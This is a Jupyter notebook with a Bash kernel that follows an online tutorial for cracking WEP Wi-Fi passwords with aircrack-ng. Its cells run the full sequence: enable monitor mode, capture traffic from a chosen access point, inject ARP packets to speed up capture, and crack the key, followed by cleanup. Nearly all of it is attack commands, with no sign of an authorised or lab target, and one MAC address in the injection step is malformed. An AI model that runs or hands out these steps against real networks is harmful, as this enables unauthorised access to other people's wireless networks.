{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tutorial \n",
    "\n",
    "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wep-passwords-with-aircrack-ng-0147340/\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lo        no wireless extensions.\n",
      "\n",
      "wlan0     IEEE 802.11abgn  ESSID:\"VM717ED96\"  \n",
      "          Mode:Managed  Frequency:2.412 GHz  Access Point: 90:5C:44:C3:56:8A   \n",
      "          Bit Rate=1 Mb/s   Tx-Power=20 dBm   \n",
      "          Retry short limit:7   RTS thr:off   Fragment thr:off\n",
      "          Power Management:off\n",
      "          Link Quality=42/70  Signal level=-68 dBm  \n",
      "          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n",
      "          Tx excessive retries:1  Invalid misc:68   Missed beacon:0\n",
      "\n",
      "virbr0    no wireless extensions.\n",
      "\n",
      "vboxnet0  no wireless extensions.\n",
      "\n",
      "vboxnet1  no wireless extensions.\n",
      "\n",
      "docker0   no wireless extensions.\n",
      "\n",
      "eth0      no wireless extensions.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# get wireless device configuration\n",
    "\n",
    "iwconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for sogloarcadius: \r\n"
     ]
    }
   ],
   "source": [
    "# put the wireless adapter in monitor mode\n",
    "# aircrack-ng will rename wlan0 to mon0\n",
    "\n",
    "sudo airmon-ng start wlan0\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for sogloarcadius: \r\n"
     ]
    }
   ],
   "source": [
    "#start capturing traffic\n",
    "\n",
    "sudo airodump-ng mon0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# start a specific capture\n",
    "\n",
    "airodump-ng --bssid 00:09:5B:6F:64:1E -c 11 -w WEPcrack mon0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#inject ARP traffic\n",
    "\n",
    "aireplay-ng -3 -b 00::09:58:6F:64:1E -h 44:60:57:c8:58:A0 mon0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# crack the password\n",
    "\n",
    "aircrack-ng WEPcrack-01.cap"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cleaning up"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# stop monitor mode\n",
    "\n",
    "airmon-ng stop wlan0\n",
    "\n",
    "# delete the mon0 interface\n",
    "\n",
    "iw dev mon0 del"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
